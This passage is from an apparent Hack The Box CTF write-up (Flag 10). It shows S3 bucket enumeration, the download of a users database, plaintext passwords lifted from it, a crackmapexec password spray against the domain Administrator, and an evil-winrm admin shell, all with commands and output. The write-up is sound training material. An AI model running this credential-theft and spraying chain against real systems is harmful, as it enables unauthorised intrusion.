---

### Demolish (Flag 10)

We can also list the objects in the bucket databases, the only object that catches the eye is the `amzcorp_users.db` that could get `credentials`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local s3api list-objects --bucket databases | jq
{
  "Contents": [
    {
      "Key": "amzcorp_emp_data.db",
      "LastModified": "2025-08-03T06:08:18+00:00",
      "ETag": "\"6f018ec428e38f1afebcbc26e12d994a\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    },
    {
      "Key": "amzcorp_orders.db",
      "LastModified": "2025-08-03T06:08:17+00:00",
      "ETag": "\"e3650f8b06b5fcb3c72a7c53219a9053\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    },
    {
      "Key": "amzcorp_products.db",
      "LastModified": "2025-08-03T06:08:20+00:00",
      "ETag": "\"72cf5ef0412404ed5636801a20e8397f\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    },
    {
      "Key": "amzcorp_users.db",
      "LastModified": "2025-08-03T06:08:19+00:00",
      "ETag": "\"834b3fbb81109790a798385d5987a5fd\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    }
  ],
  "RequestCharged": null,
  "Prefix": null
}
```

We can make a `get-object` to download the **amzcorp_users.db** to our computer

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ aws --endpoint-url http://cloud.amzcorp.local s3api get-object --bucket databases --key amzcorp_users.db amzcorp_users.db | jq
{
  "AcceptRanges": "bytes",
  "LastModified": "2025-08-03T06:08:19+00:00",
  "ContentLength": 12288,
  "ETag": "\"834b3fbb81109790a798385d5987a5fd\"",
  "ContentLanguage": "en-US",
  "ContentType": "binary/octet-stream",
  "Metadata": {}
}
```

As it is a file of `sqlite3` format we can open it with `sqlitebrowser`, in the `users` table we find different users with their possible passwords

![](/blog/images/htb/1*sq2hVCY54uo6x4xwS7vE5g.png)

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$cat password.txt
Summer2021!
amz@123
K2h3v4n@#!5_34
G4Df0_9*%
DF2!@gJhC
BH34@!-FDc00
BBp_!sXd#vG
```

We created a list with the passwords and when we tried them for the `Administrator` user we found one that returns valid and this being an admin also a `Pwn3d!`

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ crackmapexec smb amzcorp.local -u Administrator -p password.txt
SMB         dc01.amzcorp.local 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)
SMB         dc01.amzcorp.local 445    DC01             [-] amzcorp.local\Administrator:Summer2021! STATUS_LOGON_FAILURE
SMB         dc01.amzcorp.local 445    DC01             [-] amzcorp.local\Administrator:amz@123 STATUS_LOGON_FAILURE
SMB         dc01.amzcorp.local 445    DC01             [+] amzcorp.local\Administrator:K2h3v4n@#!5_34 (Pwn3d!)
```

Finally we can connect using `evil-winrm` as `Administrator` .

```
┌──(kali㉿kali)-[~/Desktop/HTB/AWS-Fortresses]
└─$ evil-winrm -i amzcorp.local -u Administrator -p 'K2h3v4n@#!5_34'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
amzcorp\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
AWS{wr3ck3d_r3s1st0r}
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
